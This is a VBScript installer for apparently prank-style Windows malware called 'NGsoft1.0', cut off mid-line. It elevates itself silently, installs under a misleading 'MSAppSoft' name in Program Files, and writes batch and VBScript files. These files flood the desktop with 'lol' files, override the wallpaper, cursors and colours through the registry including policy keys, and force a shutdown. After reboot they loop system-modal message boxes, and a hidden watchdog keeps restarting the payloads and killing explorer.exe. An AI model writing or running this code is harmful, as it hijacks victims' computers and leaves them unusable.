Option Explicit
Dim fso, sh, DEST, build, f

Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")
DEST  = sh.ExpandEnvironmentStrings("%ProgramFiles%") & "\MSAppSoft"
build = sh.ExpandEnvironmentStrings("%TEMP%") & "\ngsbuild"

' ---- elevation check ----
On Error Resume Next
If Not fso.FolderExists(DEST) Then fso.CreateFolder DEST
Set f = fso.CreateTextFile(DEST & "\.wtest", True)
f.Close
If Err.Number <> 0 Then
    Err.Clear
    On Error GoTo 0
    sh.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 0
    WScript.Quit
End If
On Error GoTo 0
fso.DeleteFile DEST & "\.wtest", True

If fso.FolderExists(build) Then fso.DeleteFolder build, True
fso.CreateFolder build

' ============================================================ generate
WF DEST & "\Start.bat", Array( _
"@echo off", _
"setlocal enabledelayedexpansion", _
"title Start", _
"set ""DEST=%~dp0""", _
"cd /d ""%DEST%""", _
"", _
"set N=0", _
"for /f %%c in ('tasklist /v /fi ""imagename eq cmd.exe"" 2^>nul ^| find /c /i ""Start""') do set N=%%c", _
"if %N% GTR 1 exit /b", _
"", _
"if exist ""%DEST%\phase1.done"" goto phase2", _
"", _
"for /l %%i in (1,1,50) do call :mklol %%i", _
"call :wall", _
"call :cursor", _
"call :colors", _
"> ""%DEST%\phase1.done"" echo done", _
"shutdown -s -f -t 0", _
"exit /b", _
"", _
":mklol", _
"if ""%~1""==""1"" (>""%USERPROFILE%\Desktop\lol.txt"" echo lol) else (>""%USERPROFILE%\Desktop\lol (%~1).txt"" echo lol)", _
"if defined PUBLIC (>>""%PUBLIC%\Desktop\lol (%~1).txt"" echo lol) else (>>""%ALLUSERSPROFILE%\Desktop\lol (%~1).txt"" echo lol)", _
"exit /b", _
"", _
":wall", _
"reg add ""HKCU\Control Panel\Desktop"" /v Wallpaper /t REG_SZ /d ""%DEST%RedWallPaper.bmp"" /f", _
"reg add ""HKCU\Control Panel\Desktop"" /v WallpaperStyle /t REG_SZ /d ""2"" /f", _
"reg add ""HKCU\Control Panel\Desktop"" /v TileWallpaper /t REG_SZ /d ""0"" /f", _
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v Wallpaper /t REG_SZ /d ""%DEST%RedWallPaper.bmp"" /f", _
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v WallpaperStyle /t REG_SZ /d ""2"" /f", _
"exit /b", _
"", _
":cursor", _
"reg add ""HKCU\Control Panel\Cursors"" /ve /t REG_EXPAND_SZ /d ""N (system scheme)"" /f", _
"for %%a in (Arrow Help AppStarting Wait Crosshair IBeam NWPen No SizeNS SizeWE SizeNWSE SizeNESW SizeAll UpArrow Hand) do reg add ""HKCU\Control Panel\Cursors"" /v %%a /t REG_EXPAND_SZ /d ""%DEST%NCursor.cur"" /f", _
"exit /b", _
"", _
":colors", _
"reg add ""HKCU\Control Panel\Colors"" /v ActiveTitle /t REG_SZ /d ""0 0 255"" /f", _
"reg add ""HKCU\Control Panel\Colors"" /v GradientActiveTitle /t REG_SZ /d ""0 0 255"" /f", _
"reg add ""HKCU\Control Panel\Colors"" /v InactiveTitle /t REG_SZ /d ""0 0 128"" /f", _
"reg add ""HKCU\Control Panel\Colors"" /v TitleText /t REG_SZ /d ""255 255 255"" /f", _
"reg add ""HKCU\Software\Microsoft\Windows\DWM"" /v AccentColor /t REG_DWORD /d 4292114432 /f", _
"reg add ""HKCU\Software\Microsoft\Windows\DWM"" /v ColorizationColor /t REG_DWORD /d 3288365268 /f", _
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"" /v ColorPrevalence /t REG_DWORD /d 1 /f", _
"exit /b", _
"", _
":phase2", _
"start """" wscript.exe //nologo ""%DEST%\payload.vbs"" notice", _
"start """" wscript.exe //nologo ""%DEST%\payload.vbs"" alarm", _
"start """" ""%DEST%\ImNGsoft.exe""", _
"start """" wscript.exe //nologo ""%DEST%\payload.vbs"" hide ""%DEST%\CheckSoft.bat""", _
"", _
":loop", _
"> ""%DEST%\hb1.tmp"" echo .", _
"start /wait """" wscript.exe //nologo ""%DEST%\payload.vbs"" lol", _
"goto loop" _
)

WF DEST & "\CheckSoft.bat", Array( _
"@echo off", _
"title CheckSoft", _
"set ""DEST=%~dp0""", _
"cd /d ""%DEST%""", _
":loop", _
"del ""%DEST%\hb1.tmp"" 2>nul", _
"del ""%DEST%\hb2.tmp"" 2>nul", _
"ping -n 8 127.0.0.1 >nul", _
"if not exist ""%DEST%\hb1.tmp"" start """" wscript.exe //nologo ""%DEST%\payload.vbs"" hide ""%DEST%\Start.bat""", _
"if not exist ""%DEST%\hb2.tmp"" start """" ""%DEST%\ImNGsoft.exe""", _
"taskkill /f /im explorer.exe >nul 2>nul", _
"ping -n 4 127.0.0.1 >nul", _
"tasklist /fi ""imagename eq explorer.exe"" | find /i ""explorer"" >nul || start """" explorer.exe", _
"ping -n 56 127.0.0.1 >nul", _
"goto loop" _
)

WF DEST & "\payload.vbs", Array( _
"Option Explicit", _
"Dim m, sh, p, wav", _
"If WScript.Arguments.Count = 0 Then WScript.Quit", _
"m = LCase(WScript.Arguments(0))", _
"Set sh = CreateObject(""WScript.Shell"")", _
"Select Case m", _
"Case ""hide""", _
"    sh.Run """""" & WScript.Arguments(1) & """""", 0, False", _
"Case ""notice""", _
"    MsgBox ""Reboot detected."" & vbCrLf & vbCrLf & ""Phase 2 begins. There is no escape."", vbInformation + vbSystemModal, ""NGsoft1.0""", _
"Case ""lol""", _
"    Do", _
"        MsgBox ""lol"", vbExclamation + vbSystemModal, ""lol""", _
"    Loop", _
"Case ""alarm""", _
"    On Error Resume Next", _
"    wav = sh.ExpandEnvironmentStrings(
